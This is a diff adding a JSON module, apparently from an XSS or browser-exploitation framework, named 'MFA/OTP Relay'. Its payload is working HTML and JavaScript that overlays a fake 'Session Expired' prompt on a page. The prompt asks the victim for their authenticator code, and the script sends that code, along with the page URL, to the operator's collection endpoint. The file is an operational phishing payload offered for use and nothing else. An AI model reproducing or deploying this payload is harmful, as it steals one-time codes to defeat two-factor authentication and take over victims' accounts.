@@ -1,0 +1,22 @@
+{
+  "name": "MFA/OTP Relay",
+  "description": "Displays a session-expired overlay that relays the victim's 6-digit MFA/OTP code to the operator in real time",
+  "category": "MFA Relay",
+  "icon": "",
+  "inputs": [
+    {
+      "id": 0,
+      "label": "Company / Product Name",
+      "type": "string",
+      "required": true
+    },
+    {
+      "id": 1,
+      "label": "Prompt Message",
+      "type": "string",
+      "required": false
+    }
+  ],
+  "payload": "<div class=\"mfa-box\"><div class=\"mfa-logo\">🔒</div><h2 class=\"mfa-title\">Session Expired</h2><p class=\"mfa-subtitle\" id=\"mfaMsg\">Your session expired. Enter the 6-digit code from your authenticator app to continue.</p><form id=\"mfaForm\"><div class=\"mfa-field\"><label class=\"mfa-label\" for=\"mfaCode\">Authentication Code</label><input class=\"mfa-input\" type=\"text\" id=\"mfaCode\" inputmode=\"numeric\" maxlength=\"6\" pattern=\"[0-9]*\" autocomplete=\"one-time-code\" placeholder=\"000000\" required></div><button type=\"submit\" class=\"mfa-btn\" id=\"mfaBtn\">Verify</button></form><p class=\"mfa-error\" id=\"mfaError\"></p><p class=\"mfa-footer\">{{ params[0] }} © 2026</p></div><script>(function(){var custom='{{ params[1] }}';var msgEl=document.getElementById('mfaMsg');if(custom&&msgEl){msgEl.textContent=custom;}var form=document.getElementById('mfaForm');var input=document.getElementById('mfaCode');var btn=document.getElementById('mfaBtn');var errEl=document.getElementById('mfaError');var moduleId='{{module_id}}';input.addEventListener('input',function(){input.value=input.value.replace(/\\D/g,'').slice(0,6);});function send(){return fetch('c/{{victim_id}}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({data_type:'module_data',module_id:moduleId,metadata:{code:input.value,url:window.location.href,timestamp:new Date().toISOString()}})});}function attempt(remaining){return send().catch(function(){return null;}).then(function(res){if(res&&res.ok){setTimeout(function(){__removeModule();},1200);return true;}if(remaining>0){return attempt(remaining-1);}return false;});}form.addEventListener('submit',function(e){e.preventDefault();var code=input.value.replace(/\\D/g,'');if(code.length!==6){errEl.textContent='Please enter the 6-digit code from your authenticator app.';errEl.style.display='block';return;}btn.disabled=true;btn.textContent='Verifying...';errEl.style.display='none';attempt(1).then(function(ok){if(ok){return;}btn.disabled=false;btn.textContent='Verify';errEl.textContent='Verification failed. Please check the code and try again.';errEl.style.display='block';});});})();</script><style>.mfa-box{background:#fff;border-radius:12px;padding:36px;max-width:400px;width:90%;box-shadow:0 12px 40px rgba(0,0,0,0.3);animation:popIn .3s ease-out;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif}.mfa-logo{font-size:44px;text-align:center;margin-bottom:16px}.mfa-title{text-align:center;color:#333;margin:0 0 6px;font-size:22px}.mfa-subtitle{text-align:center;color:#666;margin:0 0 24px;font-size:14px;line-height:1.5}.mfa-field{margin-bottom:16px}.mfa-label{display:block;margin-bottom:6px;color:#333;font-weight:500;font-size:14px}.mfa-input{width:100%;padding:12px;border:2px solid #e0e0e0;border-radius:6px;font-size:20px;letter-spacing:6px;text-align:center;box-sizing:border-box;outline:none;transition:border-color .2s;font-family:'JetBrains Mono',monospace}.mfa-input:focus{border-color:#667eea}.mfa-btn{width:100%;padding:12px;background:#667eea;color:#fff;border:none;border-radius:6px;font-size:16px;font-weight:600;cursor:pointer;transition:background .2s}.mfa-btn:hover{background:#5a6fd6}.mfa-btn:disabled{opacity:.7;cursor:default}.mfa-error{display:none;color:#e53e3e;font-size:13px;text-align:center;margin:12px 0 0}.mfa-footer{text-align:center;color:#999;font-size:12px;margin:20px 0 0}@keyframes popIn{from{opacity:0;transform:scale(.9) translateY(-10px)}to{opacity:1;transform:scale(1) translateY(0)}}</style>",
+  "link": "c/{{victim_id}}"
+}
